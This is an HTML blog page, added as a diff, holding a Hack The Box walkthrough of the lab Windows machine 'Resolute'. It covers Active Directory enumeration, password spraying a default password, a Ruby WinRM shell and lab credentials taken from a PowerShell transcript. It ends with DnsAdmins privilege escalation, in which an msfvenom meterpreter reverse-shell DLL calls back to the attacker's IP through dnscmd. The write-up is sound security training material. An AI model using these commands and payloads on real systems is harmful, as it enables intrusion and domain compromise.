@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.6" />
+
+    
+    
+    
+
+<title>Hack The Box - Resolute • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box - Resolute"/>
+<meta name="twitter:description" content="Resolute is a Windows machine considered easy/medium and Active Directory oriented. An anonymous login allows you to list accounts in the domain and identify a default password. Obtaining a shell thtough WinRM allows then to list the domain properties and to find a password for a user member of the local &ldquo;DnsAdmins&rdquo; group. Privilege escalation is done through a DLL hijacking."/>
+
+<meta property="og:title" content="Hack The Box - Resolute" />
+<meta property="og:description" content="Resolute is a Windows machine considered easy/medium and Active Directory oriented. An anonymous login allows you to list accounts in the domain and identify a default password. Obtaining a shell thtough WinRM allows then to list the domain properties and to find a password for a user member of the local &ldquo;DnsAdmins&rdquo; group. Privilege escalation is done through a DLL hijacking." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haax9.github.io/en/walkthroughs/hackthebox/resolute/" />
+<meta property="article:published_time" content="2020-06-06T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2020-06-06T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      
+          <a href="https://haax9.github.io/en">
+          
+          
+          
+          <div class="author-image">
+            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+        
+      <p class="site__description">
+        <a href="https://haax9.github.io">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/en/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+		<li>
+			<a href="https://cheatsheet.haax.fr" target="_blank">Cheasheet</a>
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haax9" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	&nbsp;<a href="https://haaxmax.github.io/en/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/fr/walkthroughs/hackthebox/resolute/" hreflang="fr" lang="fr" class="langLink">Français</a>
+      <a rel="alternate" href="/fr/walkthroughs/hackthebox/resolute/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2020 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>Hack The Box - Resolute</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Jun 6, 2020
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 9 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>Resolute is a Windows machine considered easy/medium and Active Directory oriented. An anonymous login allows you to list accounts in the domain and identify a default password. Obtaining a shell thtough WinRM allows then to list the domain properties and to find a password for a user member of the local &ldquo;DnsAdmins&rdquo; group. Privilege escalation is done through a DLL hijacking.</p>
+
+<p><strong>Disclaimer :</strong> It is a rather quick presentation that deliberately omits the various research areas. Only the actual results and a quick approach are presented.</p>
+
+<h2 id="discovery-enumeration">Discovery / Enumeration</h2>
+
+<p>A quick port scan gives us running services on the machine.</p>
+
+<pre><code class="language-bash">$ sudo nmap -sS -T4 -p0-10000 -sV -O -sC 10.10.10.169 -v 
+
+Nmap scan report for 10.10.10.169
+Host is up (0.13s latency).
+Not shown: 9988 closed ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  tcpwrapped
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-02-11 18:35:03Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp open  mc-nmf       .NET Message Framing
+</code></pre>
+
+<p>We manage to retrieve the domain and the different services tell us that we&rsquo;re facing an Active Directory domain controler.</p>
+
+<p>We quickly find that it is possible to request the AD without prior authentication. This behavior allow us to get several informations such as the user list. In the accounts description, we can see what seems to be a default password for the user marko, interesting !</p>
+
+<pre><code class="language-bash">$ enum4linux -a 10.10.10.169
+
+ ============================= 
+|    Users on 10.10.10.169    |
+ ============================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
+index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail  Name: (null)  Desc: (null)
+index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)  Desc: Built-in account for administering the computer/domain
+index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela Name: (null)  Desc: (null)
+index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette  Name: (null)  Desc: (null)
+index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika Name: (null)  Desc: (null)
+index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire Name: (null)  Desc: (null)
+index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude Name: (null)  Desc: (null)
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)  Desc: A user account managed by the system.
+index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia  Name: (null)  Desc: (null)
+index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)  Desc: (null)
+index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)  Desc: Built-in account for guest access to the computer/domain
+index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo  Name: (null)  Desc: (null)
+index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)  Desc: Key Distribution Center Service Account
+index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: (null)  Desc: (null)
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak Desc: Account created. Password set to Welcome123!
+index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie  Name: (null)  Desc: (null)
+index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki  Name: (null)  Desc: (null)
+index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo  Name: (null)  Desc: (null)
+index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)  Desc: (null)
+index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand Desc: (null)
+index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally  Name: (null)  Desc: (null)
+index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon  Name: (null)  Desc: (null)
+index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve  Name: (null)  Desc: (null)
+index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie Name: (null)  Desc: (null)
+index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita Name: (null)  Desc: (null)
+index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)  Desc: (null)
+index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)  Desc: (null)
+
+</code></pre>
+
+<p><strong>Important</strong> : In order to avoid DNS resolution trouble, don&rsquo;t forget to add machine entries in the <code>resolv.conf</code> and <code>hosts</code> files.</p>
+
+<pre><code class="language-bash">$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 kalinux
+
+10.10.10.169 megabank.local
+</code></pre>
+
+<pre><code class="language-bash">$ cat /etc/resolv.conf 
+search megabank.local
+nameserver 10.10.10.169
+</code></pre>
+
+<h2 id="default-password-and-user-shell">Default password and user shell</h2>
+
+<p>We indicates the note <code>Account created. Password set to Welcome123!</code> for user marko. At this stage, we can think about a default password set by system administrators.</p>
+
+<p>We build a simple user wordlist based on the previously retrieved ones and try to log in with each of them.</p>
+
+<pre><code class="language-bash">$ crackmapexec smb 10.10.10.169 -u user_list -p 'Welcome123!'
+CME          10.10.10.169:445 RESOLUTE        [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:MEGABANK)
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\abigail:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Administrator:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\angela:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annette:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\annika:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claire:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\claude:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\felicia:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\fred:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\Guest:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\gustavo:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marcus:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [-] MEGABANK\marko:Welcome123! STATUS_LOGON_FAILURE 
+CME          10.10.10.169:445 RESOLUTE        [+] MEGABANK\melanie:Welcome123! 
+[*] KTHXBYE!
+</code></pre>
+
+<p>The user <code>melanie</code> is  then owned !
+However, this account is not an administrator and possibilities for remote command execution are limited.
+This is where WinRM (Windows Remote Management) comes in. It is a Microsoft HTTP service/protocol, based on WS-Management (SOAP) that allows remote administration of Windows machines.
+Back to our nmap scan, the port <strong>5985</strong>, used by default by WinRM, is open.</p>
+
+<p>Several ways to exploit it. I chose to use the following Ruby script.</p>
+
+<pre><code class="language-ruby">$ cat winrm_shell.rb 
+require 'winrm'
+
+conn = WinRM::Connection.new(
+  endpoint: 'http://10.10.10.169:5985/wsman',
+  user: 'MEGABANK\melanie',
+  password: 'Welcome123!',
+)
+
+command=&quot;&quot;
+
+conn.shell(:powershell) do |shell|
+    until command == &quot;exit\n&quot; do
+        print &quot;PS &gt; &quot;
+        command = gets
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end
+    puts &quot;Exiting with code #{output.exitcode}&quot;
+end
+</code></pre>
+
+<p>Which give the first machine access and the first flag !</p>
+
+<pre><code class="language-bash">$ ruby winrm_shell.rb 
+PS &gt; whoami
+megabank\melanie
+
+PS &gt; type ../Desktop/user.txt
+0cxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+PS &gt; 
+</code></pre>
+
+<h2 id="enumeration-and-second-account-compromission">Enumeration and second account compromission</h2>
+
+<p>A quick enumeration phase about users and groups indicates that <code>ryan</code> is member of the <code>Contractors</code>group, which is also member of the local <code>DnsAdmins</code>group. This user could be interesting.</p>
+
+<pre><code class="language-bash">PS &gt; net user ryan /domain
+User name                    ryan
+Full Name                    Ryan Bertrand
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/22/2020 9:15:02 AM
+Password expires             Never
+Password changeable          2/23/2020 9:15:02 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      
+Global Group memberships     *Domain Users         *Contractors          
+The command completed successfully.
+</code></pre>
+
+<pre><code class="language-bash">PS &gt; net localgroup DnsAdmins
+Alias name     DnsAdmins
+Comment        DNS Administrators Group
+
+Members
+
+-------------------------------------------------------------------------------
+Contractors
+The command completed successfully.
+</code></pre>
+
+<p>The next step is about file enumeration and information gathering. After several tries, we manage to get informations about the target account, left in a file on the disk.</p>
+
+<pre><code class="language-bash">PS &gt; findstr /si ryan *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.vbs
+
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:PS&gt;ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;PS megabank\ryan@RESOLUTE Documents&gt; &quot;
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:PS megabank\ryan@RESOLUTE Documents&gt;
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:Username: MEGABANK\ryan
+PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt:RunAs User: MEGABANK\ryan
+findstr.exe : FINDSTR: Cannot open Windows\Panther\UnattendGC\diagerr.xml
+    + CategoryInfo          : NotSpecified: (FINDSTR: Cannot...dGC\diagerr.xml:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+FINDSTR: Cannot open Windows\Panther\UnattendGC\diagwrn.xml
+FINDSTR: Cannot open Windows\PLA\System\System Diagnostics.xml
+FINDSTR: Cannot open Windows\PLA\System\System Performance.xml
+FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagerr.xml
+FINDSTR: Cannot open Windows\System32\Sysprep\Panther\diagwrn.xml
+</code></pre>
+
+<p>By modifying the WinRM script used for the first user, we can get a new shell, using our fresh new access !</p>
+
+<pre><code class="language-bash">PS &gt; whoami
+megabank\ryan
+PS &gt; pwd
+
+Path                   
+----                   
+C:\Users\ryan\Documents
+</code></pre>
+
+<h2 id="privilege-escalation-dll-hijacking">Privilege escalation - DLL Hijacking</h2>
+
+<p>Some Internet research tells us a way to perform a privilege escalation on a Windows machine for a user who is a member of the <code>DnsAdmins</code> group.</p>
+
+<p>It is indeed possible to have the DLL of our choice loaded by the DNS service. This DLL will then be executed with SYSTEM privilege.</p>
+
+<p>The following resources explain the vulnerability:
+- <a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</a>
+- <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2</a></p>
+
+<p>First step, generate a DLL containing a reverse shell to our machine.</p>
+
+<pre><code class="language-bash">$ sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.28 LPORT=5566 -f dll &gt; privesc.dll
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 5120 bytes
+</code></pre>
+
+<p>Then, a simple and temporary SMB server, used to remotely load our DLL.</p>
+
+<pre><code class="language-bash">$ sudo smbserver.py MYSHARE /path/to/HackTheBox/Resolute -smb2support
+Impacket v0.9.21.dev1+20200220.181330.03cbe6e8 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+</code></pre>
+
+<p>Last step of preparation, we run our handler in order to get the incoming connection.</p>
+
+<p>Once this is done, the exploitation is rather fast and have to be fast. Indeed, I&rsquo;m not able to say if it comes from a possible antivirus on the machine, detecting our malicious DLL, or a simple configuration in order to make the machine accessible to everyone, but it turns out that each user seems to have a limited time to exploit the vulnerability once the registry key is set up. After a while, the registry key is cleaned up.</p>
+
+<p>Good! The first step is to tell the DNS server to fetch our malicious DLL.</p>
+
+<pre><code class="language-bash">PS &gt; dnscmd 10.10.10.169 /config /serverlevelplugindll \\10.10.14.28\TESTLOL\privesc.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+</code></pre>
+
+<p>We can confirm the command sucess by inspecting the associated registry key</p>
+
+<pre><code class="language-bash">PS &gt; Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+
+ServerLevelPluginDll : \\10.10.14.28\TESTLOL\privesc.dll
+PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\
+PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS
+PSChildName          : Parameters
+PSDrive              : HKLM
+PSProvider           : Microsoft.PowerShell.Core\Registry
+</code></pre>
+
+<p>Then, we have to restart the DNS service in order to let him load the DLL.</p>
+
+<pre><code class="language-bash">PS &gt; sc.exe stop dns
+
+SERVICE_NAME: dns 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+</code></pre>
+
+<pre><code class="language-bash">PS &gt; sc.exe query dns
+
+SERVICE_NAME: dns 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 1  STOPPED 
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+</code></pre>
+
+<pre><code class="language-bash">PS &gt; sc.exe start dns
+
+SERVICE_NAME: dns 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3340
+        FLAGS              : 
+
+</code></pre>
+
+<p>And that&rsquo;s how we can get a sweet meterpreter&hellip; :)</p>
+
+<pre><code class="language-bash">msf5 exploit(multi/handler) &gt; 
+[*] Sending stage (206403 bytes) to 10.10.10.169
+[*] Meterpreter session 1 opened (10.10.14.28:5566 -&gt; 10.10.10.169:63985) at 2020-02-22 17:02:49 +0100
+
+msf5 exploit(multi/handler) &gt; sessions 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; shell
+Process 3288 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;c
+</code></pre>
+
+<p>&hellip; Allowing us to compromize the machine and giving us the root flag !</p>
+
+<pre><code class="language-bash">C:\Users\Administrator\Desktop&gt;whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop&gt;hostname
+hostname
+Resolute
+
+</code></pre>
+
+<p>w00ted !</p>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/en/walkthroughs/hackthebox/forest/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Hack The Box - Forest</span>
+    </a>
+    
+    
+    <a href="/en/walkthroughs/hackthebox/nest/" class="post--navigation-next">
+      <span class="navigation-tittle">Hack The Box - Nest</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-126182747-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
